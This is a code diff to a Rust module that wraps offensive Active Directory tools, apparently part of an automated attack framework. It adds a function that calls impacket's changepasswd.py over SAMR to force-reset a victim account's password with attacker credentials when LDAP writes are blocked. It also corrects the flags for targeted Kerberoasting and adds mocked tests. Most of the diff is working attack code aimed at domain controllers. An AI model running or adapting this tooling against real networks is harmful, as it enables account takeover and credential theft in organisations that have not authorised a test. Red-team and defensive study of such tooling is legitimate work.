@@ -56,6 +56,11 @@ pub async fn bloodyad_add_group_member(args: &Value) -> Result<ToolOutput> {
 /// When `ticket_path` is provided it takes precedence over password/hash.
 /// The env var `KRB5CCNAME` is set to the path so bloodyad's Kerberos stack
 /// picks it up without a separate `kinit` step.
+///
+/// If this fails with an LDAP `unicodePwd` modify rejection (e.g. DC requires
+/// LDAPS / signing for password attribute writes), fall back to
+/// [`samr_change_password`] which performs the same ForceChangePassword
+/// primitive over SAMR/RPC instead of LDAP.
 pub async fn bloodyad_set_password(args: &Value) -> Result<ToolOutput> {
     let domain = required_str(args, "domain")?;
     let dc_ip = required_str(args, "dc_ip")?;
@@ -94,6 +99,50 @@ pub async fn bloodyad_set_password(args: &Value) -> Result<ToolOutput> {
             .execute()
             .await
     }
+}
+
+/// Force-change a target user's password via impacket `changepasswd.py`
+/// using SAMR/RPC.
+///
+/// Required args: `domain`, `username`, `password`, `dc_ip`, `target_user`,
+/// `new_password`
+/// Optional args: `protocol` (`rpc-samr` (default) | `smb` | `kpasswd`)
+///
+/// This is the SAMR-protocol counterpart to [`bloodyad_set_password`] and is
+/// the right tool when the DC rejects the LDAP `unicodePwd` modify path —
+/// typically because the server requires LDAPS / signing / channel-binding
+/// for password attribute writes. The SAMR `SamrSetInformationUser2` call
+/// used here goes over the SAMR named pipe (`\\PIPE\samr`) and does not
+/// touch the LDAP password policy at all, so it succeeds in many configs
+/// where bloodyAD fails.
+///
+/// The underlying ACL primitive (`User-Force-Change-Password` extended right,
+/// granted via ForceChangePassword / GenericAll / AllExtendedRights ACEs)
+/// is identical; only the wire protocol differs.
+pub async fn samr_change_password(args: &Value) -> Result<ToolOutput> {
+    let domain = required_str(args, "domain")?;
+    let username = required_str(args, "username")?;
+    let password = required_str(args, "password")?;
+    let dc_ip = required_str(args, "dc_ip")?;
+    let target_user = required_str(args, "target_user")?;
+    let new_password = required_str(args, "new_password")?;
+    let protocol = optional_str(args, "protocol").unwrap_or("rpc-samr");
+
+    // impacket target spec: `[domain/]username[@<targetName or address>]`.
+    // For changepasswd.py the positional target is the VICTIM; the attacker
+    // identity is passed via -altuser / -altpass.
+    let target = format!("{domain}/{target_user}@{dc_ip}");
+
+    CommandBuilder::new("changepasswd.py")
+        .arg("-reset")
+        .flag("-protocol", protocol)
+        .flag("-newpass", new_password)
+        .flag("-altuser", username)
+        .flag("-altpass", password)
+        .arg(target)
+        .timeout_secs(60)
+        .execute()
+        .await
 }
 
 /// Grant GenericAll rights via `bloodyAD add genericAll`.
@@ -200,6 +249,11 @@ pub async fn pywhisker(args: &Value) -> Result<ToolOutput> {
 /// Perform targeted Kerberoasting via `targetedKerberoast.py`.
 ///
 /// Required args: `domain`, `username`, `password`, `dc_ip`, `target_user`
+///
+/// Flag note: upstream (ShutdownRepo) argparse uses `--request-user` for the
+/// single target (older `-t` shorthand was never accepted) and `--dc-ip`
+/// (double dash) for the DC. Passing `-t` causes a parser error before any
+/// LDAP work happens.
 pub async fn targeted_kerberoast(args: &Value) -> Result<ToolOutput> {
     let domain = required_str(args, "domain")?;
     let username = required_str(args, "username")?;
@@ -211,8 +265,8 @@ pub async fn targeted_kerberoast(args: &Value) -> Result<ToolOutput> {
         .flag("-d", domain)
         .flag("-u", username)
         .flag("-p", password)
-        .flag("-t", target_user)
-        .flag("-dc-ip", dc_ip)
+        .flag("--request-user", target_user)
+        .flag("--dc-ip", dc_ip)
         .timeout_secs(120)
         .execute()
         .await
@@ -458,6 +512,46 @@ mod tests {
         });
         assert_eq!(required_str(&args, "target_user").unwrap(), "victim");
         assert_eq!(required_str(&args, "new_password").unwrap(), "NewP@ss123!");
+    }
+
+    // ── samr_change_password arg validation ────────────────────────────
+
+    #[test]
+    fn samr_change_password_missing_new_password() {
+        let args = json!({
+            "domain": "contoso.local",
+            "username": "admin",
+            "password": "P@ssw0rd!",
+            "dc_ip": "192.168.58.10",
+            "target_user": "victim"
+        });
+        assert!(required_str(&args, "new_password").is_err());
+    }
+
+    #[test]
+    fn samr_change_password_default_protocol() {
+        let args = json!({
+            "domain": "contoso.local",
+            "username": "admin",
+            "password": "P@ssw0rd!",
+            "dc_ip": "192.168.58.10",
+            "target_user": "victim",
+            "new_password": "NewP@ss123!"
+        });
+        let protocol = optional_str(&args, "protocol").unwrap_or("rpc-samr");
+        assert_eq!(protocol, "rpc-samr");
+    }
+
+    #[test]
+    fn samr_change_password_target_format() {
+        // The impacket target spec for changepasswd.py is the VICTIM's
+        // `[domain/]username[@target]`; the attacker identity rides on
+        // -altuser / -altpass.
+        let domain = "contoso.local";
+        let target_user = "bob";
+        let dc_ip = "192.168.58.10";
+        let target = format!("{domain}/{target_user}@{dc_ip}");
+        assert_eq!(target, "contoso.local/bob@192.168.58.10");
     }
 
     // ── bloodyad_add_genericall arg validation ─────────────────────────
@@ -937,6 +1031,35 @@ mod tests {
             "ticket_path": "/tmp/ares-tickets/contoso_local__fabrikam_local__Administrator.ccache"
         });
         assert!(super::bloodyad_set_password(&args).await.is_ok());
+    }
+
+    #[tokio::test]
+    async fn samr_change_password_executes() {
+        mock::push(mock::success());
+        let args = json!({
+            "domain": "contoso.local",
+            "username": "alice",
+            "password": "P@ssw0rd!",   // pragma: allowlist secret
+            "dc_ip": "192.168.58.10",
+            "target_user": "bob",
+            "new_password": "NewP@ss!99"
+        });
+        assert!(super::samr_change_password(&args).await.is_ok());
+    }
+
+    #[tokio::test]
+    async fn samr_change_password_explicit_protocol_executes() {
+        mock::push(mock::success());
+        let args = json!({
+            "domain": "contoso.local",
+            "username": "alice",
+            "password": "P@ssw0rd!",   // pragma: allowlist secret
+            "dc_ip": "192.168.58.10",
+            "target_user": "bob",
+            "new_password": "NewP@ss!99",
+            "protocol": "smb"
+        });
+        assert!(super::samr_change_password(&args).await.is_ok());
     }
 
     #[tokio::test]
